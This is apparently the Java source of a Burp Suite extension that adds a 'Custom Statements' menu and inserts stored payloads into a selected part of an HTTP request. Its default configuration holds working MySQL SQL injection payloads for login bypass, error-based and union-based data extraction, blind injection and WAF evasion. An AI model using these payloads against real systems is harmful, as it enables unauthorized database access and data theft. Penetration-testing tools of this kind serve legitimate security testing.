/*
 * Custom Statement Menu for HackBar
 * Allows users to create and manage custom SQL statements
 */
package burp;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JSeparator;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 * Payload项目类
 */
class PayloadItem {
    private String name;
    private String payload;
    
    public PayloadItem(String name, String payload) {
        this.name = name;
        this.payload = payload;
    }
    
    public String getName() { return name; }
    public String getPayload() { return payload; }
}

/**
 * Payload分类类
 */
class PayloadCategory {
    private String name;
    private String description;
    private List<PayloadItem> payloads;
    
    public PayloadCategory(String name, String description) {
        this.name = name;
        this.description = description;
        this.payloads = new ArrayList<>();
    }
    
    public String getName() { return name; }
    public String getDescription() { return description; }
    public List<PayloadItem> getPayloads() { return payloads; }
    public void addPayload(PayloadItem payload) { payloads.add(payload); }
}

/**
 * Custom Statement Menu - 自定义语句菜单
 * @author HackBar Extension
 */
public class CustomStatement_Menu extends JMenu{
    public BurpExtender myburp;
    private static final String CONFIG_FILE_JSON = "custom_payloads.json";
    private List<PayloadCategory> categories;
    
    CustomStatement_Menu(BurpExtender burp){
        this.setText("Custom Statements");
        this.myburp = burp;
        this.categories = new ArrayList<>();
        
        // 加载自定义语句
        loadCustomStatements();
        
        // 创建菜单
        createMenu();
    }
    
    /**
     * 从配置文件加载自定义语句
     */
    private void loadCustomStatements() {
        categories.clear();
        
        // 仅加载JSON格式
        File jsonFile = new File(CONFIG_FILE_JSON);
        if (jsonFile.exists()) {
            try {
                loadFromJson();
                return;
            } catch (Exception e) {
                System.err.println("Failed to load JSON config: " + e.getMessage());
            }
        }
        
        // 如果JSON文件不存在，创建默认配置
        createDefaultJsonFile();
        try {
            loadFromJson();
        } catch (Exception e) {
            System.err.println("Failed to load default config: " + e.getMessage());
        }
    }
    
    /**
     * 从JSON文件加载配置
     */
    private void loadFromJson() throws IOException {
        String content = new String(Files.readAllBytes(Paths.get(CONFIG_FILE_JSON)), "UTF-8");
        parseJsonConfig(content);
    }
    
    /**
     * 简单的JSON解析器（专门用于我们的配置格式）
     */
    private void parseJsonConfig(String jsonContent) {
        // 移除空白字符和换行
        jsonContent = jsonContent.replaceAll("\\s+", " ").trim();
        
        // 查找categories对象
        int categoriesStart = jsonContent.indexOf("\"categories\":");
        if (categoriesStart == -1) return;
        
        int braceStart = jsonContent.indexOf("{", categoriesStart);
        if (braceStart == -1) return;
        
        // 找到categories对象的结束位置
        int braceCount = 1;
        int pos = braceStart + 1;
        int categoriesEnd = -1;
        
        while (pos < jsonContent.length() && braceCount > 0) {
            char c = jsonContent.charAt(pos);
            if (c == '{') braceCount++;
            else if (c == '}') braceCount--;
            if (braceCount == 0) categoriesEnd = pos;
            pos++;
        }
        
        if (categoriesEnd == -1) return;
        
        String categoriesContent = jsonContent.substring(braceStart + 1, categoriesEnd);
        parseCategoriesContent(categoriesContent);
    }
    
    /**
     * 解析categories内容
     */
    private void parseCategoriesContent(String content) {
        // 简单的状态机解析
        int pos = 0;
        while (pos < content.length()) {
            // 查找分类名称
            int nameStart = content.indexOf("\"", pos);
            if (nameStart == -1) break;
            
            int nameEnd = content.indexOf("\"", nameStart + 1);
            if (nameEnd == -1) break;
            
            String categoryName = content.substring(nameStart + 1, nameEnd);
            
            // 查找该分类的对象
            int objStart = content.indexOf("{", nameEnd);
            if (objStart == -1) break;
            
            // 找到对象结束位置
            int braceCount = 1;
            int objPos = objStart + 1;
            int objEnd = -1;
            
            while (objPos < content.length() && braceCount > 0) {
                char c = content.charAt(objPos);
                if (c == '{') braceCount++;
                else if (c == '}') braceCount--;
                if (braceCount == 0) objEnd = objPos;
                objPos++;
            }
            
            if (objEnd == -1) break;
            
            String categoryContent = content.substring(objStart + 1, objEnd);
            
            // 解析分类内容
            PayloadCategory category = parseCategoryContent(categoryName, categoryContent);
            if (category != null) {
                categories.add(category);
            }
            
            pos = objEnd + 1;
        }
    }
    
    /**
     * 解析单个分类的内容
     */
    private PayloadCategory parseCategoryContent(String categoryName, String content) {
        // 查找description
        String description = "";
        int descStart = content.indexOf("\"description\":");
        if (descStart != -1) {
            int descValueStart = content.indexOf("\"", descStart + 13);
            if (descValueStart != -1) {
                int descValueEnd = content.indexOf("\"", descValueStart + 1);
                if (descValueEnd != -1) {
                    description = content.substring(descValueStart + 1, descValueEnd);
                }
            }
        }
        
        PayloadCategory category = new PayloadCategory(categoryName, description);
        
        // 查找payloads数组
        int payloadsStart = content.indexOf("\"payloads\":");
        if (payloadsStart == -1) return category;
        
        int arrayStart = content.indexOf("[", payloadsStart);
        if (arrayStart == -1) return category;
        
        int arrayEnd = content.lastIndexOf("]");
        if (arrayEnd == -1 || arrayEnd <= arrayStart) return category;
        
        String payloadsContent = content.substring(arrayStart + 1, arrayEnd);
        parsePayloadsArray(category, payloadsContent);
        
        return category;
    }
    
    /**
     * 解析payloads数组
     */
    private void parsePayloadsArray(PayloadCategory category, String content) {
        int pos = 0;
        while (pos < content.length()) {
            // 查找payload对象
            int objStart = content.indexOf("{", pos);
            if (objStart == -1) break;
            
            int objEnd = content.indexOf("}", objStart);
            if (objEnd == -1) break;
            
            String payloadContent = content.substring(objStart + 1, objEnd);
            
            // 解析name和payload
            String name = extractJsonValue(payloadContent, "name");
            String payload = extractJsonValue(payloadContent, "payload");
            
            if (!name.isEmpty() && !payload.isEmpty()) {
                category.addPayload(new PayloadItem(name, payload));
            }
            
            pos = objEnd + 1;
        }
    }
    
    /**
     * 从JSON内容中提取指定字段的值
     */
    private String extractJsonValue(String content, String fieldName) {
        String searchPattern = "\"" + fieldName + "\":";
        int fieldStart = content.indexOf(searchPattern);
        if (fieldStart == -1) return "";
        
        int valueStart = content.indexOf("\"", fieldStart + searchPattern.length());
        if (valueStart == -1) return "";
        
        int valueEnd = valueStart + 1;
        while (valueEnd < content.length()) {
            char c = content.charAt(valueEnd);
            if (c == '"' && content.charAt(valueEnd - 1) != '\\') {
                break;
            }
            valueEnd++;
        }
        
        if (valueEnd >= content.length()) return "";
        
        return content.substring(valueStart + 1, valueEnd);
    }
    

    

    
    /**
     * 创建默认的JSON文件
     */
    private void createDefaultJsonFile() {
        try {
            // 完整的默认JSON配置内容
            String defaultContent = "{\n" +
                "  \"categories\": {\n" +
                "    \"基础注入测试\": {\n" +
                "      \"description\": \"基本的SQL注入测试payload\",\n" +
                "      \"payloads\": [\n" +
                "        {\n" +
                "          \"name\": \"单引号测试\",\n" +
                "          \"payload\": \"'\"\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"经典OR注入\",\n" +
                "          \"payload\": \"' OR '1'='1\"\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"数字OR注入\",\n" +
                "          \"payload\": \"' OR 1=1--\"\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"管理员绕过\",\n" +
                "          \"payload\": \"admin'--\"\n" +
                "        }\n" +
                "      ]\n" +
                "    },\n" +
                "    \"数据库信息获取\": {\n" +
                "      \"description\": \"获取数据库基本信息的payload\",\n" +
                "      \"payloads\": [\n" +
                "        {\n" +
                "          \"name\": \"获取数据库名(extractvalue)\",\n" +
                "          \"payload\": \"'%09AND%09extractvalue(1,concat(0x7e,database(),0x7e))--\"\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"获取数据库名(updatexml)\",\n" +
                "          \"payload\": \"'%09AND%09updatexml(1,concat(0x7e,database(),0x7e),1)--\"\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"获取用户信息\",\n" +
                "          \"payload\": \"'%09AND%09extractvalue(1,concat(0x7e,user(),0x7e))--\"\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"获取版本信息\",\n" +
                "          \"payload\": \"'%09AND%09extractvalue(1,concat(0x7e,version(),0x7e))--\"\n" +
                "        }\n" +
                "      ]\n" +
                "    },\n" +
                "    \"表结构枚举\": {\n" +
                "      \"description\": \"枚举数据库表和列信息\",\n" +
                "      \"payloads\": [\n" +
                "        {\n" +
                "          \"name\": \"获取表名列表(extractvalue)\",\n" +
                "          \"payload\": \"'%09AND%09extractvalue(1,concat(0x7e,(SELECT%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()),0x7e))--\"\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"获取表名列表(updatexml)\",\n" +
                "          \"payload\": \"'%09AND%09updatexml(1,concat(0x7e,(SELECT%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()),0x7e),1)--\"\n" +
                "        }\n" +
                "      ]\n" +
                "    },\n" +
                "    \"联合注入\": {\n" +
                "      \"description\": \"Union-based SQL注入payload\",\n" +
                "      \"payloads\": [\n" +
                "        {\n" +
                "          \"name\": \"Union获取数据库名\",\n" +
                "          \"payload\": \"'%09UNION%09SELECT%091,2,database()--\"\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"Union获取表名\",\n" +
                "          \"payload\": \"'%09UNION%09SELECT%091,2,group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()--\"\n" +
                "        }\n" +
                "      ]\n" +
                "    },\n" +
                "    \"盲注测试\": {\n" +
                "      \"description\": \"时间盲注和布尔盲注payload\",\n" +
                "      \"payloads\": [\n" +
                "        {\n" +
                "          \"name\": \"时间延迟测试\",\n" +
                "          \"payload\": \"'%09AND%09sleep(5)--\"\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"条件时间盲注\",\n" +
                "          \"payload\": \"'%09AND%09if(length(database())>5,sleep(5),1)--\"\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"布尔盲注-长度测试\",\n" +
                "          \"payload\": \"'%09AND%09length(database())>5--\"\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"布尔盲注-字符测试\",\n" +
                "          \"payload\": \"'%09AND%09ascii(substr(database(),1,1))>97--\"\n" +
                "        }\n" +
                "      ]\n" +
                "    },\n" +
                "    \"错误注入\": {\n" +
                "      \"description\": \"基于错误的SQL注入方法\",\n" +
                "      \"payloads\": [\n" +
                "        {\n" +
                "          \"name\": \"EXP函数错误注入\",\n" +
                "          \"payload\": \"'%09AND%09exp(~(select%09*%09from(select%09database())a))--\"\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"GTID函数错误注入\",\n" +
                "          \"payload\": \"'%09AND%09gtid_subset(database(),1)--\"\n" +
                "        }\n" +
                "      ]\n" +
                "    },\n" +
                "    \"WAF绕过\": {\n" +
                "      \"description\": \"绕过Web应用防火墙的技巧\",\n" +
                "      \"payloads\": [\n" +
                "        {\n" +
                "          \"name\": \"注释绕过\",\n" +
                "          \"payload\": \"'/**/AND/**/extractvalue(1,concat(0x7e,database(),0x7e))--\"\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"大小写绕过\",\n" +
                "          \"payload\": \"'%09AnD%09extractvalue(1,concat(0x7e,database(),0x7e))--\"\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"版本注释绕过\",\n" +
                "          \"payload\": \"'%09/*!50000AND*/%09extractvalue(1,concat(0x7e,database(),0x7e))--\"\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"AND符号绕过\",\n" +
                "          \"payload\": \"'%09%26%26%09extractvalue(1,concat(0x7e,database(),0x7e))--\"\n" +
                "        }\n" +
                "      ]\n" +
                "    }\n" +
                "  }\n" +
                "}";
            
            try (BufferedWriter writer = new BufferedWriter(new FileWriter(CONFIG_FILE_JSON))) {
                writer.write(defaultContent);
            }
        } catch (IOException e) {
            System.err.println("Error creating default JSON file: " + e.getMessage());
        }
    }
    

    

    
    /**
     * 创建菜单项
     */
    private void createMenu() {
        // 清空现有菜单项
        this.removeAll();
        
        // 添加管理菜单项
        JMenuItem reloadItem = new JMenuItem("Reload Payloads");
        reloadItem.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                reloadStatements();
            }
        });
        this.add(reloadItem);
        
        // 添加分隔符
        this.add(new JSeparator());
        
        // 为每个分类创建子菜单
        for (PayloadCategory category : categories) {
            List<PayloadItem> payloads = category.getPayloads();
            
            if (payloads.isEmpty()) {
                continue;
            }
            
            // 如果只有一个分类，直接添加到主菜单
            if (categories.size() == 1) {
                for (PayloadItem payload : payloads) {
                    JMenuItem menuItem = createPayloadMenuItem(payload);
                    this.add(menuItem);
                }
            } else {
                // 多个分类时，创建子菜单
                JMenu categoryMenu = new JMenu(category.getName());
                
                // 如果有描述，设置为tooltip
                // if (!category.getDescription().isEmpty()) {
                //     categoryMenu.setToolTipText(category.getDescription());
                // }
                
                for (PayloadItem payload : payloads) {
                    JMenuItem menuItem = createPayloadMenuItem(payload);
                    categoryMenu.add(menuItem);
                }
                
                this.add(categoryMenu);
            }
        }
    }
    
    /**
     * 创建payload菜单项
     */
    private JMenuItem createPayloadMenuItem(PayloadItem payload) {
        String displayText = payload.getName().length() > 30 ? 
            payload.getName().substring(0, 30) + "..." : payload.getName();
        
        JMenuItem menuItem = new JMenuItem(displayText);
        menuItem.setActionCommand(payload.getPayload());
        menuItem.addActionListener(new CustomStatementListener(myburp));
        menuItem.setToolTipText(payload.getPayload()); // 添加tooltip显示完整payload
        
        return menuItem;
    }
    
    /**
     * 重新加载自定义语句
     */
    private void reloadStatements() {
        categories.clear();
        loadCustomStatements();
        createMenu();
        JOptionPane.showMessageDialog(this, "Payloads reloaded successfully!");
    }
    

}

/**
 * 自定义语句菜单项监听器
 */
class CustomStatementListener implements ActionListener {
    BurpExtender myburp;
    
    CustomStatementListener(BurpExtender burp) {
        myburp = burp;
    }
    
    @Override
    public void actionPerformed(ActionEvent e) {
        try {
            int[] selectedIndex = myburp.context.getSelectionBounds();
            IHttpRequestResponse req = myburp.context.getSelectedMessages()[0];
            byte[] request = req.getRequest();
            byte[] param = new byte[selectedIndex[1] - selectedIndex[0]];
            System.arraycopy(request, selectedIndex[0], param, 0, selectedIndex[1] - selectedIndex[0]);
            String selectString = new String(param);
            String customStatement = e.getActionCommand();
            
            // 应用自定义语句
            byte[] newRequest = applyCustomStatement(request, selectString, customStatement, selectedIndex);
            req.setRequest(newRequest);
            
        } catch (Exception ex) {
            JOptionPane.showMessageDialog(null, 
                "Error applying custom statement: " + ex.getMessage(), 
                "Error", 
                JOptionPane.ERROR_MESSAGE);
        }
    }
    
    /**
     * 应用自定义语句到请求中
     */
    private byte[] applyCustomStatement(byte[] request, String selectedString, String customStatement, int[] selectedIndex) {
        // 使用Methods类的do_modify_request方法来修改请求
        return Methods.do_modify_request(request, selectedIndex, customStatement);
    }
}